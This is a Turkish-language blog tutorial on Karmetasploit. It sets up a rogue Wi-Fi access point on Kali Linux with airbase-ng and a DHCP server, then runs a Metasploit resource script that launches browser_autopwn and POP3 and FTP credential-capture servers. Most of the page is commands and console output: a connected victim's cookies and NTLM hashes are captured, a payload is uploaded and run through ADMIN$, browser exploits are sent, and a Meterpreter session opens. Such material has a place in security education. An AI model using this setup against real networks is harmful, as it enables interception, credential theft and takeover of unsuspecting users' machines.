---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-16T14:04:00Z"
excerpt: Bu yazıda, Metasploit içinde Karmetasploit hakkında bilgi vermeye çalışacağız.
  Genel olarak kurulum, ayarlarının yapılması ve örnek kullanımı göreceğiz.
guid: https://www.siberoloji.com/?p=1223
id: 1223
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Karmetasploit
url: /tr/msf-karmetasploit/
---

  Bu yazıda, Metasploit içinde Karmetasploit hakkında bilgi vermeye çalışacağız. Genel olarak kurulum, ayarlarının yapılması ve örnek kullanımı göreceğiz. 
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="karmetasploit-nedir">Karmetasploit Nedir? 
<!-- /wp:heading -->

  Karmetasploit, access point noktaları oluşturma, parola yakalama, bilgi toplama ve web tarayıcı saldırıları gerçekleştirilmek için kullanılan bir programdır. Kısaca, sahte bir modem veya access point oluşturursunuz. Bir takım kullanıcılar bu noktaya bağlanır. Siz de Karmetasploit sayesinde trafiği dinleyebilirsiniz. 
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="karmetasploit-ayarlama">Karmetasploit Ayarlama 
<!-- /wp:heading -->

  Şimdi, Kali Linux içinde Karmetasploit’in kullanıma hazır hale getirilmesini görelim. İlk adımımız kontrol dosyasının indirme ile başlıyor. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# wget <a href="https://www.offensive-security.com/assets/images/2015/04/karma.rc_.txt">https://www.offensive-security.com/assets/images/2015/04/karma.rc_.txt</a>
--2015-04-03 16:17:27-- <a href="https://www.offensive-security.com/downloads/karma.rc">https://www.offensive-security.com/downloads/karma.rc</a>
Resolving <a href="http://www.offensive-security.com/">www.offensive-security.com</a> <strong>(</strong><a href="http://www.offensive-security.com/">www.offensive-security.com</a><strong>)</strong>... 198.50.176.211
Connecting to <a href="http://www.offensive-security.com/">www.offensive-security.com</a> <strong>(</strong><a href="http://www.offensive-security.com/">www.offensive-security.com</a><strong>)</strong>|198.50.176.211|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1089 <strong>(</strong>1.1K<strong>)</strong> <strong>[</strong>text/plain]

Saving to: `karma.rc' 100%[======================================&gt;] 1,089 --.-K/s in 0s

2015-04-03 16:17:28 (35.9 MB/s) - `karma.rc' saved <strong>[</strong>1089/1089]
root@kali:~#
</code></pre>
<!-- /wp:code -->

  Oluşturacağımız Access Point’e kullanıcılar bağlandığında ne olması gerekir? Tabii ki bağlanan kullanıcıya bir IP adresi atanması beklenir. Bu durumda, Kali Linux işletim sistemini DHCP Sunucu olarak ayarlamalıyız. 
 

  Şimdi Kali Linux içine&nbsp;<code>isc-dhcp-server</code>&nbsp;kuralım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# apt update
...snip...
root@kali:~# apt -y install isc-dhcp-server
Reading package lists... Done
Building dependency tree       
Reading state information... Done
...snip...
root@kali:~#
</code></pre>
<!-- /wp:code -->

  Kurulum tamamlandıktan sonra&nbsp;<code>dhcpd.conf</code>&nbsp;dosyasında gerekli ayarları yapalım.&nbsp;<code>dhscpd.conf</code>&nbsp;dosyasının bir yedeğini aldıktan sonra aşağıdaki örneğe benzer hale getirmelisiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# cat /etc/dhcp/dhcpd.conf
option domain-name-servers 10.0.0.1;

default-lease-time 60;
max-lease-time 72;

ddns-update-style none;

authoritative;

log-facility local7;

subnet 10.0.0.0 netmask 255.255.255.0 <strong>{</strong>
  range 10.0.0.100 10.0.0.254;
  option routers 10.0.0.1;
  option domain-name-servers 10.0.0.1;
<strong>}</strong>
root@kali:~#
</code></pre>
<!-- /wp:code -->

  Şimdi de bir kaç gerekliliği kuralım. 
 

 
<h2 class="wp-block-heading" id="libsqlite3-dev-paketini-kuralım">libsqlite3-dev Paketini Kuralım</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# apt -y install libsqlite3-dev
Reading package lists... Done
Building dependency tree       
Reading state information... Done
...snip...
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="activerecord-sqlite3-ruby-modülleri-kuralım">activerecord sqlite3 Ruby Modülleri Kuralım</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# gem install activerecord sqlite3
Fetching: activerecord-5.0.0.1.gem <strong>(</strong>100%<strong>)</strong>
Successfully installed activerecord-5.0.0.1
Parsing documentation <strong>for </strong>activerecord-5.0.0.1
Installing ri documentation <strong>for </strong>activerecord-5.0.0.1
Done installing documentation <strong>for </strong>activerecord after 7 seconds
Fetching: sqlite3-1.3.12.gem <strong>(</strong>100%<strong>)</strong>
Building native extensions.  This could take a <strong>while</strong>...
Successfully installed sqlite3-1.3.12
Parsing documentation <strong>for </strong>sqlite3-1.3.12
Installing ri documentation <strong>for </strong>sqlite3-1.3.12
Done installing documentation <strong>for </strong>sqlite3 after 0 seconds
2 gems installed
root@kali:~#
</code></pre>
<!-- /wp:code -->

  Artık Karmetsploit kullanmaya hazırız. Yapacağımız işlemler sırasıyla şöyle; 
 

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>Wireless kartı tespit edelim.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>wireless kartı monitor mod ile başlatalım.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Yeni bir Kablosuz ağ başlatalım.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

 
<h2 class="wp-block-heading" id="wireless-arayüz-adını-tespit-edelim">Wireless Arayüz Adını Tespit Edelim</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# airmon-ng


PHY     Interface       Driver          Chipset

phy0	wlan0	        ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="airmon-ng-başlatalım">airmon-ng Başlatalım</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# airmon-ng start wlan0

PHY	Interface	Driver		Chipset

phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n

		<strong>(</strong>mac80211 monitor mode vif enabled <strong>for</strong> <strong>[</strong>phy0]wlan0 on <strong>[</strong>phy0]wlan0mon<strong>)</strong>
		<strong>(</strong>mac80211 station mode vif disabled <strong>for</strong> <strong>[</strong>phy0]wlan0<strong>)</strong>

Found 2 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill <strong>(</strong>some of<strong>)</strong> them!

PID     Name
693     dhclient
934     wpa_supplicant
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="monitor-mod-ile-airbase-ng-başlatalım">Monitor Mod ile airbase-ng Başlatalım</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# airbase-ng -P -C 30 -e "U R PWND" -v wlan0mon
For information, no action required: Using gettimeofday<strong>()</strong> instead of /dev/rtc
22:52:25  Created tap interface at0
22:52:25  Trying to set MTU on at0 to 1500
22:52:25  Trying to set MTU on wlan0mon to 1800
22:52:25  Access Point with BSSID 00:C0:CA:82:D9:63 started.
</code></pre>
<!-- /wp:code -->

  Yukarıdaki çıktıda görüldüğü gibi&nbsp;<code>at0</code>&nbsp;isminde yeni bir wireless arayüz başlatıldı. Şimdi, kendi bilgisayarımızı bu ağa dahil edelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
root@kali:~#
</code></pre>
<!-- /wp:code -->

  DHCP Sunucuyu başlatmak üzereyiz. Sunucu başladığında toplanan bilgilerin kayıt edileceği bir veri tabanı ihtiyacımız olacak. Bunun için önce bir veri tabanı oluşturalım ve DHCP sunuyu başlatalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# touch /var/lib/dhcp/dhcpd.leases
root@kali:~# dhcpd -cf /etc/dhcp/dhcpd.conf at0
Internet Systems Consortium DHCP Server 4.3.3
Copyright 2004-2015 Internet Systems Consortium.
All rights reserved.
For info, please visit <a href="https://www.isc.org/software/dhcp/">https://www.isc.org/software/dhcp/</a>
Config file: /etc/dhcp/dhcpd.conf
Database file: /var/lib/dhcp/dhcpd.leases
PID file: /var/run/dhcpd.pid
Wrote 0 leases to leases file.
Listening on LPF/at0/00:c0:ca:82:d9:63/10.0.0.0/24
Sending on   LPF/at0/00:c0:ca:82:d9:63/10.0.0.0/24
Sending on   Socket/fallback/fallback-net

root@kali:~# ps aux | grep <strong>[</strong>d]hcpd
root      2373  0.0  0.4  28448  9532 ?        Ss   13:45   0:00 dhcpd -cf /etc/dhcp/dhcpd.conf at0
root@kali:~#
</code></pre>
<!-- /wp:code -->

  <code>msfconsole</code>&nbsp;programını harici kaynak olarak, ilk başta indirdiğimiz&nbsp;<code>karma.rc_.txt</code>&nbsp;dosyasını göstererek başlatalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfconsole -q -r karma.rc_.txt

<strong>[</strong><strong>*</strong><strong>]</strong> Processing karma.rc_.txt <strong>for </strong>ERB directives.
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> db_connect postgres:toor@127.0.0.1/msfbook
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> use auxiliary/server/browser_autopwn
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> setg AUTOPWN_HOST 10.0.0.1
AUTOPWN_HOST <strong>=&gt;</strong> 10.0.0.1
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> setg AUTOPWN_PORT 55550
AUTOPWN_PORT <strong>=&gt;</strong> 55550
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> setg AUTOPWN_URI /ads
AUTOPWN_URI <strong>=&gt;</strong> /ads
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> set LHOST 10.0.0.1
LHOST <strong>=&gt;</strong> 10.0.0.1
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> set LPORT 45000
LPORT <strong>=&gt;</strong> 45000
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> set SRVPORT 55550
SRVPORT <strong>=&gt;</strong> 55550
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> set URIPATH /ads
URIPATH <strong>=&gt;</strong> /ads
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> run
<strong>[</strong><strong>*</strong><strong>]</strong> Auxiliary module execution completed
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> use auxiliary/server/capture/pop3
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> set SRVPORT 110
SRVPORT <strong>=&gt;</strong> 110
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> set SSL false
SSL <strong>=&gt;</strong> false
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> run
<strong>[</strong><strong>*</strong><strong>]</strong> Auxiliary module execution completed
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> use auxiliary/server/capture/pop3
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> set SRVPORT 995
SRVPORT <strong>=&gt;</strong> 995
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> set SSL true
SSL <strong>=&gt;</strong> true
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> run
<strong>[</strong><strong>*</strong><strong>]</strong> Auxiliary module execution completed
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> use auxiliary/server/capture/ftp
<strong>[</strong><strong>*</strong><strong>]</strong> Setup
resource <strong>(</strong>karma.rc_.txt<strong>)&gt;</strong> run
<strong>[</strong><strong>*</strong><strong>]</strong> Listening on 0.0.0.0:110...
<strong>[</strong><strong>*</strong><strong>]</strong> Auxiliary module execution completed
<strong>[</strong><strong>*</strong><strong>]</strong> Server started.


msf auxiliary<strong>(</strong>http<strong>)</strong> <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

  Artık oluşturduğumuz Acces Point üzerinden dinleme yapıyoruz. Bir kullanıcı kablosuz bağlantı ile bu noktaya bağlanır ve web üzerinden işlemler yapmaya başladıında tüm trafik veri tabanımıza kayıt edilmektedir. 
 

  Kayıt edilen paketlere bakalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf auxiliary<strong>(</strong>http<strong>)</strong> <strong>&gt;</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1276 XID 87 <strong>(</strong>IN::A <a href="http://www.msn.com/">www.msn.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1276 XID 87 <strong>(</strong>IN::A <a href="http://www.msn.com/">www.msn.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> HTTP REQUEST 10.0.0.100 <strong>&gt;</strong> <a href="http://www.msn.com/">www.msn.com:80</a> GET / Windows IE 5.01 cookies<strong>=</strong>MC1<strong>=</strong>V<strong>=</strong>3&amp;GUID<strong>=</strong>e2eabc69be554e3587acce84901a53d3; MUID<strong>=</strong>E7E065776DBC40099851B16A38DB8275; mh<strong>=</strong>MSFT; CULTURE<strong>=</strong>EN-US; zip<strong>=</strong>z:68101|la:41.26|lo:-96.013|c:US|hr:1; FlightGroupId<strong>=</strong>14; FlightId<strong>=</strong>BasePage; hpsvr<strong>=</strong>M:5|F:5|T:5|E:5|D:blu|W:F; hpcli<strong>=</strong>W.H|L.|S.|R.|U.L|C.|H.; ushpwea<strong>=</strong>wc:USNE0363; wpv<strong>=</strong>2
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1279 XID 88 <strong>(</strong>IN::A <a href="http://adwords.google.com/">adwords.google.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1279 XID 88 <strong>(</strong>IN::A <a href="http://adwords.google.com/">adwords.google.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1280 XID 89 <strong>(</strong>IN::A <a href="http://blogger.com/">blogger.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1280 XID 89 <strong>(</strong>IN::A <a href="http://blogger.com/">blogger.com</a><strong>)</strong>
...snip...
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1289 XID 95 <strong>(</strong>IN::A <a href="http://gmail.com/">gmail.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1289 XID 95 <strong>(</strong>IN::A <a href="http://gmail.com/">gmail.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1289 XID 95 <strong>(</strong>IN::A <a href="http://gmail.com/">gmail.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1292 XID 96 <strong>(</strong>IN::A <a href="http://gmail.google.com/">gmail.google.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1292 XID 96 <strong>(</strong>IN::A <a href="http://gmail.google.com/">gmail.google.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1292 XID 96 <strong>(</strong>IN::A <a href="http://gmail.google.com/">gmail.google.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1292 XID 96 <strong>(</strong>IN::A <a href="http://gmail.google.com/">gmail.google.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1292 XID 96 <strong>(</strong>IN::A <a href="http://gmail.google.com/">gmail.google.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Request '/ads' from 10.0.0.100:1278
<strong>[</strong><strong>*</strong><strong>]</strong> Recording detection from User-Agent
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1292 XID 96 <strong>(</strong>IN::A <a href="http://gmail.google.com/">gmail.google.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Browser claims to be MSIE 5.01, running on Windows 2000
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1293 XID 97 <strong>(</strong>IN::A <a href="http://google.com/">google.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Error: SQLite3::SQLException cannot start a transaction within a transaction /usr/lib/ruby/1.8/sqlite3/errors.rb:62:in `check'/usr/lib/ruby/1.8/sqlite3/resultset.rb:47:in `check'/usr/lib/ruby/1.8/sqlite3/resultset.rb:39:in `commence'/usr/lib/ruby/1.8/sqlite3
...snip...
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://ecademy.com/">ecademy.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://facebook.com/">facebook.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://gather.com/">gather.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://gmail.com/">gmail.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://gmail.google.com/">gmail.google.com</a>:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880:S=snePRUjY-zgcXpEV; NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6hI1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://google.com/">google.com</a>:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880:S=snePRUjY-zgcXpEV; NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6hI1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://linkedin.com/">linkedin.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://livejournal.com/">livejournal.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://monster.com/">monster.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://myspace.com/">myspace.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://plaxo.com/">plaxo.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://ryze.com/">ryze.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
[*] Sending MS03-020 Internet Explorer Object Type to 10.0.0.100:1278...
[*] HTTP REQUEST 10.0.0.100 &gt; slashdot.org:80 GET /forms.html Windows IE 5.01 cookies=
[*] Received 10.0.0.100:1360 LMHASH:00 NTHASH: OS:Windows 2000 2195 LM:Windows 2000 5.0
...snip...
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.monster.com/">www.monster.com:80</a> GET /forms.html Windows IE 5.01 cookies=
[*] Received 10.0.0.100:1362 TARGET\P0WN3D LMHASH:47a8cfba21d8473f9cc1674cedeba0fa6dc1c2a4dd904b72 NTHASH:ea389b305cd095d32124597122324fc470ae8d9205bdfc19 OS:Windows 2000 2195 LM:Windows 2000 5.0
[*] Authenticating to 10.0.0.100 as TARGET\P0WN3D...
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.myspace.com/">www.myspace.com:80</a> GET /forms.html Windows IE 5.01 cookies=
[*] AUTHENTICATED as TARGETP0WN3D...
[*] Connecting to the ADMIN$ share...
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.plaxo.com/">www.plaxo.com:80</a> GET /forms.html Windows IE 5.01 cookies=
[*] Regenerating the payload...
[*] Uploading payload...
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.ryze.com/">www.ryze.com:80</a> GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.slashdot.org/">www.slashdot.org:80</a> GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.twitter.com/">www.twitter.com:80</a> GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.xing.com/">www.xing.com:80</a> GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.yahoo.com/">www.yahoo.com:80</a> GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://xing.com/">xing.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://yahoo.com/">yahoo.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
[*] Created UxsjordQ.exe...
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://ziggs.com/">ziggs.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
[*] Connecting to the Service Control Manager...
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://care.com/">care.com</a>:80 GET / Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.gather.com/">www.gather.com:80</a> GET /forms.html Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.ziggs.com/">www.ziggs.com:80</a> GET /forms.html Windows IE 5.01 cookies=
[*] Obtaining a service manager handle...
[*] Creating a new service...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Transmitting intermediate stager for over-sized stage...(191 bytes)
[*] Removing the service...
[*] Closing service handle...
[*] Deleting UxsjordQ.exe...
[*] Sending Access Denied to 10.0.0.100:1362 TARGET\P0WN3D
[*] Received 10.0.0.100:1362 LMHASH:00 NTHASH: OS:Windows 2000 2195 LM:Windows 2000 5.0
[*] Sending Access Denied to 10.0.0.100:1362 
[*] Received 10.0.0.100:1365 TARGET\P0WN3D LMHASH:3cd170ac4f807291a1b90da20bb8eb228cf50aaf5373897d NTHASH:ddb2b9bed56faf557b1a35d3687fc2c8760a5b45f1d1f4cd OS:Windows 2000 2195 LM:Windows 2000 5.0
[*] Authenticating to 10.0.0.100 as TARGET\P0WN3D...
[*] AUTHENTICATED as TARGETP0WN3D...
[*] Ignoring request from 10.0.0.100, attack already in progress.
[*] Sending Access Denied to 10.0.0.100:1365 TARGET\P0WN3D
[*] Sending Apple QuickTime 7.1.3 RTSP URI Buffer Overflow to 10.0.0.100:1278...
[*] Sending stage (2650 bytes)
[*] Sending iPhone MobileSafari LibTIFF Buffer Overflow to 10.0.0.100:1367...
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.care2.com/">www.care2.com:80</a> GET / Windows IE 5.01 cookies=
[*] Sleeping before handling stage...
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://www.yahoo.com/">www.yahoo.com:80</a> GET / Windows IE 5.01 cookies=
[*] HTTP REQUEST 10.0.0.100 &gt; <a href="http://yahoo.com/">yahoo.com</a>:80 GET / Windows IE 5.01 cookies=
[*] Uploading DLL (75787 bytes)...
[*] Upload completed.
[*] Migrating to lsass.exe...
[*] Current server process: rundll32.exe (848)
[*] New server process: lsass.exe (232)
[*] Meterpreter session 1 opened (10.0.0.1:45017 -&gt; 10.0.0.100:1364)

msf auxiliary(http) &gt; sessions -l

Active sessions
===============

  Id  Description  Tunnel                             
  --  -----------  ------                             
  1   Meterpreter  10.0.0.1:45017 -&gt; 10.0.0.100:1364
</code></pre>
<!-- /wp:code -->

  Yukarıdaki çıktılardan, kullanıcının bir çok adrese bağlandığını ve işlemler yaptığını görebiliriz. Bu çıktıları parça parça inceleyelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"><strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1284 XID 92 <strong>(</strong>IN::A <a href="http://ecademy.com/">ecademy.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1286 XID 93 <strong>(</strong>IN::A <a href="http://facebook.com/">facebook.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1286 XID 93 <strong>(</strong>IN::A <a href="http://facebook.com/">facebook.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1287 XID 94 <strong>(</strong>IN::A <a href="http://gather.com/">gather.com</a><strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> DNS 10.0.0.100:1287 XID 94 <strong>(</strong>IN::A <a href="http://gather.com/">gather.com</a><strong>)</strong>
</code></pre>
<!-- /wp:code -->

  Bu kısımda, kullanıcının bağlanmak istediği adreslere dair DNS Lookup işlemi yapılmaktadır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"><strong>[</strong><strong>*</strong><strong>]</strong> HTTP REQUEST 10.0.0.100 <strong>&gt;</strong> <a href="http://gmail.google.com/">gmail.google.com</a>:80 GET /forms.html Windows IE 5.01 cook
ies<strong>=</strong>PREF<strong>=</strong>ID<strong>=</strong>474686c582f13be6:U<strong>=</strong>ecaec12d78faa1ba:TM<strong>=</strong>1241334857:LM<strong>=</strong>1241334880: S<strong>=</strong>snePRUjY-zgcXpEV;NID<strong>=</strong>22<strong>=</strong>nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6h I1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8

<strong>[</strong><strong>*</strong><strong>]</strong> HTTP REQUEST 10.0.0.100 <strong>&gt;</strong> <a href="http://google.com/">google.com</a>:80 GET /forms.html Windows IE 5.01 cookies<strong>=</strong>PREF<strong>=</strong>ID<strong>=</strong>474686c582f13be6:U<strong>=</strong>ecaec12d78faa1ba:TM<strong>=</strong>1241334857:LM<strong>=</strong>1241334880: S<strong>=</strong>snePRUjY-zgcXpEV;NID<strong>=</strong>22<strong>=</strong>nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4e FCH6hI1ae23g hwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
Here we can see Karmetasploit collecting cookie information from the client. This could be useful information to use <strong>in </strong>attacks against the user later on.

<strong>[</strong><strong>*</strong><strong>]</strong> Received 10.0.0.100:1362 TARGET\P0WN3D LMHASH:47a8cfba21d8473f9cc1674cedeba0fa6dc1c2a4dd904b72 NTHASH:ea389b305cd095d32124597122324fc470ae8d9205bdfc19 OS:Windows 2000 2195 LM:Windows 2000 5.0
<strong>[</strong><strong>*</strong><strong>]</strong> Authenticating to 10.0.0.100 as TARGET\P0WN3D...
<strong>[</strong><strong>*</strong><strong>]</strong> AUTHENTICATED as TARGET\P0WN3D...
<strong>[</strong><strong>*</strong><strong>]</strong> Connecting to the ADMIN$ share...
<strong>[</strong><strong>*</strong><strong>]</strong> Regenerating the payload...
<strong>[</strong><strong>*</strong><strong>]</strong> Uploading payload...
<strong>[</strong><strong>*</strong><strong>]</strong> Obtaining a service manager handle...
<strong>[</strong><strong>*</strong><strong>]</strong> Creating a new service...
<strong>[</strong><strong>*</strong><strong>]</strong> Closing service handle...
<strong>[</strong><strong>*</strong><strong>]</strong> Opening service...
<strong>[</strong><strong>*</strong><strong>]</strong> Starting the service...
<strong>[</strong><strong>*</strong><strong>]</strong> Transmitting intermediate stager <strong>for </strong>over-sized stage...<strong>(</strong>191 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Removing the service...
<strong>[</strong><strong>*</strong><strong>]</strong> Closing service handle...
<strong>[</strong><strong>*</strong><strong>]</strong> Deleting UxsjordQ.exe...
<strong>[</strong><strong>*</strong><strong>]</strong> Sending Access Denied to 10.0.0.100:1362 TARGET\P0WN3D
<strong>[</strong><strong>*</strong><strong>]</strong> Received 10.0.0.100:1362 LMHASH:00 NTHASH: OS:Windows 2000 2195 LM:Windows 2000 5.0
<strong>[</strong><strong>*</strong><strong>]</strong> Sending Access Denied to 10.0.0.100:1362
